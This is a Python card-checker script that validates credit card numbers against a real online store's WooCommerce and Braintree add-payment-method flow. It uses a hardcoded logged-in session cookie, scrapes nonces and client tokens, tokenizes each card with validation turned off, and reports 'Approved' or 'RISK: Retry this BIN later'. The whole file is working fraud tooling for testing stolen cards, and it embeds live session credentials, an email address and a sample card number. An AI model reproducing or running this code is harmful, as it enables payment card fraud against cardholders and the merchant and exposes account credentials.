def capture(string, start, end):
    start_pos, end_pos = string.find(start), string.find(
        end, string.find(start) + len(start)
    )
    return (
        string[start_pos + len(start) : end_pos]
        if start_pos != -1 and end_pos != -1
        else None
    )
    
def chk(card):
	
	import requests, re, base64, random, string, user_agent, time
	from requests_toolbelt.multipart.encoder import MultipartEncoder
	
	from requests.packages.urllib3.exceptions import InsecureRequestWarning
	
	requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
	
	card = card.strip()
	parts = re.split('[|/:]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]

	if "20" in yy:
		yy = yy.split("20")[1]
	
	
	r = requests.session()
	
	user = user_agent.generate_user_agent()



	cookies = {
    'OptanonAlertBoxClosed': '2024-08-14T15:42:16.893Z',
    '_gcl_au': '1.1.1683424992.1723650137',
    '_ga': 'GA1.1.597281703.1723650138',
    '_fbp': 'fb.1.1723650139729.725755082765286616',
    'nor': 'r',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-09-13%2017%3A58%3A55%7C%7C%7Cep%3Dhttps%3A%2F%2Fstore.ie.edu%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-09-13%2017%3A58%3A55%7C%7C%7Cep%3Dhttps%3A%2F%2Fstore.ie.edu%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    '__utmzz': 'utmcsr=(direct)|utmcmd=(none)|utmccn=(not set)',
    '__utmzzses': '1',
    'wp-wpml_current_language': 'en',
    'AKA_A2': 'A',
    'wordpress_logged_in_4655a0c50d0f66616670c751ab14b54a': 'lyy446333%7C1726423203%7CMm7x7i6u9LuuPD4s4OMx5N9ZL1NrWeJiV4AU0BPNjfK%7C26d421d4df0af543e1c474bd019e619c704e0a1b3887028f784ed8d6c330c82e',
    'sbjs_session': 'pgs%3D17%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fstore.ie.edu%2Fmy-account%2Fadd-payment-method%2F',
    '_ga_Y7HB3S34Y5': 'GS1.1.1726250336.5.1.1726251204.26.0.0',
    'OptanonConsent': 'isGpcEnabled=0&datestamp=Fri+Sep+13+2024+21%3A13%3A25+GMT%2B0300+(%D8%AA%D9%88%D9%82%D9%8A%D8%AA+%D8%B4%D8%B1%D9%82+%D8%A3%D9%88%D8%B1%D9%88%D8%A8%D8%A7+%D8%A7%D9%84%D8%B5%D9%8A%D9%81%D9%8A)&version=202407.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=641d8ae4-b5a1-4ccb-bf47-e49d644c4bf8&interactionCount=1&isAnonUser=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0003%3A1%2CC0002%3A1%2CC0004%3A1&intType=1&geolocation=EG%3BC&AwaitingReconsent=false',
    '_uetsid': 'd93b35c071f911ef9d35e9f9890749e8',
    '_uetvid': 'ca5d27405a5311ef8716494a003c45af',
}

	headers = {
    'authority': 'store.ie.edu',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    # 'cookie': 'OptanonAlertBoxClosed=2024-08-14T15:42:16.893Z; _gcl_au=1.1.1683424992.1723650137; _ga=GA1.1.597281703.1723650138; _fbp=fb.1.1723650139729.725755082765286616; nor=r; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-13%2017%3A58%3A55%7C%7C%7Cep%3Dhttps%3A%2F%2Fstore.ie.edu%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-13%2017%3A58%3A55%7C%7C%7Cep%3Dhttps%3A%2F%2Fstore.ie.edu%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; __utmzz=utmcsr=(direct)|utmcmd=(none)|utmccn=(not set); __utmzzses=1; wp-wpml_current_language=en; AKA_A2=A; wordpress_logged_in_4655a0c50d0f66616670c751ab14b54a=lyy446333%7C1726423203%7CMm7x7i6u9LuuPD4s4OMx5N9ZL1NrWeJiV4AU0BPNjfK%7C26d421d4df0af543e1c474bd019e619c704e0a1b3887028f784ed8d6c330c82e; sbjs_session=pgs%3D17%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fstore.ie.edu%2Fmy-account%2Fadd-payment-method%2F; _ga_Y7HB3S34Y5=GS1.1.1726250336.5.1.1726251204.26.0.0; OptanonConsent=isGpcEnabled=0&datestamp=Fri+Sep+13+2024+21%3A13%3A25+GMT%2B0300+(%D8%AA%D9%88%D9%82%D9%8A%D8%AA+%D8%B4%D8%B1%D9%82+%D8%A3%D9%88%D8%B1%D9%88%D8%A8%D8%A7+%D8%A7%D9%84%D8%B5%D9%8A%D9%81%D9%8A)&version=202407.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=641d8ae4-b5a1-4ccb-bf47-e49d644c4bf8&interactionCount=1&isAnonUser=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0003%3A1%2CC0002%3A1%2CC0004%3A1&intType=1&geolocation=EG%3BC&AwaitingReconsent=false; _uetsid=d93b35c071f911ef9d35e9f9890749e8; _uetvid=ca5d27405a5311ef8716494a003c45af',
    'pragma': 'no-cache',
    'referer': 'https://store.ie.edu/my-account/payment-methods/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}

	res1 = requests.get('https://store.ie.edu/my-account/add-payment-method/', cookies=cookies, headers=headers)
	r4 = res1.text
	anonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', r4).group(1)
	T = capture(r4,'wc_braintree_client_token = ["','"]')
	encoded_text = T
	decoded_text = base64.b64decode(encoded_text).decode('utf-8')
	au=re.findall(r'"authorizationFingerprint":"(.*?)"',decoded_text)[0]


	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': f'Bearer {au}',
    'braintree-version': '2018-05-10',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'pragma': 'no-cache',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '03c16169-2fbb-44eb-8e85-08dc4c3556cf',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
                'billingAddress': {
                    'postalCode': '10080',
                    'streetAddress': 'hhfhfbfv',
                },
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	res2 = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"03c16169-2fbb-44eb-8e85-08dc4c3556cf"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5332480249303415","expirationMonth":"09","expirationYear":"2028","cvv":"381","billingAddress":{"postalCode":"10080","streetAddress":"hhfhfbfv"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
	token = res2.json()['data']['tokenizeCreditCard']['token']




	headers = {
    'authority': 'api.braintreegateway.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://store.ie.edu',
    'pragma': 'no-cache',
    'referer': 'https://store.ie.edu/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': user,
}

	json_data = {
    'amount': '0.00',
    'browserColorDepth': 24,
    'browserJavaEnabled': False,
    'browserJavascriptEnabled': True,
    'browserLanguage': 'ar-EG',
    'browserScreenHeight': 867,
    'browserScreenWidth': 381,
    'browserTimeZone': -180,
    'deviceChannel': 'Browser',
    'additionalInfo': {
        'ipAddress': '196.133.9.224',
        'billingLine1': 'hhfhfbfv',
        'billingLine2': '',
        'billingCity': 'hfhdvvxv',
        'billingState': 'NY',
        'billingPostalCode': '10080',
        'billingCountryCode': 'US',
        'billingPhoneNumber': '2153652415',
        'billingGivenName': 'bbxbcbb',
        'billingSurname': 'hhxbfbb',
        'email': 'moh5527vbnm@gmail.com',
    },
    'bin': '533248',
    'dfReferenceId': '0_4a67ba51-afc1-46f7-911e-3425526d6f25',
    'clientMetadata': {
        'requestedThreeDSecureVersion': '2',
        'sdkVersion': 'web/3.106.0',
        'cardinalDeviceDataCollectionTimeElapsed': 853,
        'issuerDeviceDataCollectionTimeElapsed': 633,
        'issuerDeviceDataCollectionResult': True,
    },
    'authorizationFingerprint': au,
    'braintreeLibraryVersion': 'braintree/web/3.106.0',
    '_meta': {
        'merchantAppId': 'store.ie.edu',
        'platform': 'web',
        'sdkVersion': '3.106.0',
        'source': 'client',
        'integration': 'custom',
        'integrationType': 'custom',
        'sessionId': '03c16169-2fbb-44eb-8e85-08dc4c3556cf',
    },
}

	res3 = requests.post(
    f'https://api.braintreegateway.com/merchants/jq8x8vgv6wc36qph/client_api/v1/payment_methods/{token}/three_d_secure/lookup',
    headers=headers,
    json=json_data,
)






	nonce = res3.json()['paymentMethod']['nonce']
    
    




	



	cookies = {
    'OptanonAlertBoxClosed': '2024-08-14T15:42:16.893Z',
    '_gcl_au': '1.1.1683424992.1723650137',
    '_ga': 'GA1.1.597281703.1723650138',
    '_fbp': 'fb.1.1723650139729.725755082765286616',
    'nor': 'r',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-09-13%2017%3A58%3A55%7C%7C%7Cep%3Dhttps%3A%2F%2Fstore.ie.edu%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-09-13%2017%3A58%3A55%7C%7C%7Cep%3Dhttps%3A%2F%2Fstore.ie.edu%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    '__utmzz': 'utmcsr=(direct)|utmcmd=(none)|utmccn=(not set)',
    '__utmzzses': '1',
    'wp-wpml_current_language': 'en',
    'AKA_A2': 'A',
    'wordpress_logged_in_4655a0c50d0f66616670c751ab14b54a': 'lyy446333%7C1726423203%7CMm7x7i6u9LuuPD4s4OMx5N9ZL1NrWeJiV4AU0BPNjfK%7C26d421d4df0af543e1c474bd019e619c704e0a1b3887028f784ed8d6c330c82e',
    'sbjs_session': 'pgs%3D13%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fstore.ie.edu%2Fmy-account%2Fadd-payment-method%2F',
    'OptanonConsent': 'isGpcEnabled=0&datestamp=Fri+Sep+13+2024+21%3A01%3A35+GMT%2B0300+(%D8%AA%D9%88%D9%82%D9%8A%D8%AA+%D8%B4%D8%B1%D9%82+%D8%A3%D9%88%D8%B1%D9%88%D8%A8%D8%A7+%D8%A7%D9%84%D8%B5%D9%8A%D9%81%D9%8A)&version=202407.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=641d8ae4-b5a1-4ccb-bf47-e49d644c4bf8&interactionCount=1&isAnonUser=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0003%3A1%2CC0002%3A1%2CC0004%3A1&intType=1&geolocation=EG%3BC&AwaitingReconsent=false',
    '_uetsid': 'd93b35c071f911ef9d35e9f9890749e8',
    '_uetvid': 'ca5d27405a5311ef8716494a003c45af',
    '_ga_Y7HB3S34Y5': 'GS1.1.1726250336.5.1.1726250518.10.0.0',
}

	headers = {
    'authority': 'store.ie.edu',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'OptanonAlertBoxClosed=2024-08-14T15:42:16.893Z; _gcl_au=1.1.1683424992.1723650137; _ga=GA1.1.597281703.1723650138; _fbp=fb.1.1723650139729.725755082765286616; nor=r; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-13%2017%3A58%3A55%7C%7C%7Cep%3Dhttps%3A%2F%2Fstore.ie.edu%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-13%2017%3A58%3A55%7C%7C%7Cep%3Dhttps%3A%2F%2Fstore.ie.edu%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; __utmzz=utmcsr=(direct)|utmcmd=(none)|utmccn=(not set); __utmzzses=1; wp-wpml_current_language=en; AKA_A2=A; wordpress_logged_in_4655a0c50d0f66616670c751ab14b54a=lyy446333%7C1726423203%7CMm7x7i6u9LuuPD4s4OMx5N9ZL1NrWeJiV4AU0BPNjfK%7C26d421d4df0af543e1c474bd019e619c704e0a1b3887028f784ed8d6c330c82e; sbjs_session=pgs%3D13%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fstore.ie.edu%2Fmy-account%2Fadd-payment-method%2F; OptanonConsent=isGpcEnabled=0&datestamp=Fri+Sep+13+2024+21%3A01%3A35+GMT%2B0300+(%D8%AA%D9%88%D9%82%D9%8A%D8%AA+%D8%B4%D8%B1%D9%82+%D8%A3%D9%88%D8%B1%D9%88%D8%A8%D8%A7+%D8%A7%D9%84%D8%B5%D9%8A%D9%81%D9%8A)&version=202407.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=641d8ae4-b5a1-4ccb-bf47-e49d644c4bf8&interactionCount=1&isAnonUser=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0003%3A1%2CC0002%3A1%2CC0004%3A1&intType=1&geolocation=EG%3BC&AwaitingReconsent=false; _uetsid=d93b35c071f911ef9d35e9f9890749e8; _uetvid=ca5d27405a5311ef8716494a003c45af; _ga_Y7HB3S34Y5=GS1.1.1726250336.5.1.1726250518.10.0.0',
    'origin': 'https://store.ie.edu',
    'pragma': 'no-cache',
    'referer': 'https://store.ie.edu/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}

	data = {
    'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key': nonce,
    'braintree_cc_device_data': '',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/jq8x8vgv6wc36qph/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/jq8x8vgv6wc36qph"},"merchantId":"jq8x8vgv6wc36qph","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"IE","currencyCode":"EUR","merchantIdentifier":"jq8x8vgv6wc36qph","supportedNetworks":["visa","mastercard","amex"]},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["American Express","Discover","Maestro","UK Maestro","MasterCard","Visa"]},"threeDSecureEnabled":true,"threeDSecure":{"cardinalAuthenticationJWT":"eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI0OTlkZTdjYy04Y2E1LTQ3OTktODNmOS1lNDYyMjY4MjQ5ZjUiLCJpYXQiOjE3MjYyNTA0MjUsImV4cCI6MTcyNjI1NzYyNSwiaXNzIjoiNWM2Yzg1OTc4MjNjMTYyMWJjZGViYzMxIiwiT3JnVW5pdElkIjoiNWEzN2Y0M2M1MTJjZmIyMzg0OWI0OWRjIn0.4-XWbcmsopz3TA2dS-KuEkkWJ-aHFlZJv8di-iZ3ZLk"},"androidPay":{"displayName":"IE Publishing","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjYzMzY4MjUsImp0aSI6IjFmMzljMjNjLTI3NmUtNGFmMy05MGVjLTViNjJiOTNmOGY1OCIsInN1YiI6ImpxOHg4dmd2NndjMzZxcGgiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImpxOHg4dmd2NndjMzZxcGgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJ0b2tlbml6ZV9hbmRyb2lkX3BheSIsIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.Amddu6zWAcwIwC-2BYhl8oUCZVf00aOa1_txpNHwAyY62TCr0uJ_o8djNmiOX2_ldINJuZa3P-Gtq3l0l3nazw","paypalClientId":null,"supportedNetworks":["visa","mastercard","amex"]},"paypalEnabled":true,"paypal":{"displayName":"IE Publishing","clientId":"ASZ18y9YRjCdL0khds4Uaux1VVcbDMw4avyOcT9YoxUPOsHm2uQDwEXB68tdXvZr-fxMcIcPXdEDf4ub","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"tiendaonlineEUR","payeeEmail":null,"currencyIsoCode":"EUR"}}',
    'woocommerce-add-payment-method-nonce': anonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
    'user_msg': '',
}

	response = requests.post('https://store.ie.edu/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)

	pattern = r'Reason: (.*?)\s*</li>'
    
	text = response.text
	
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
		    result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
			
	return result
	
	
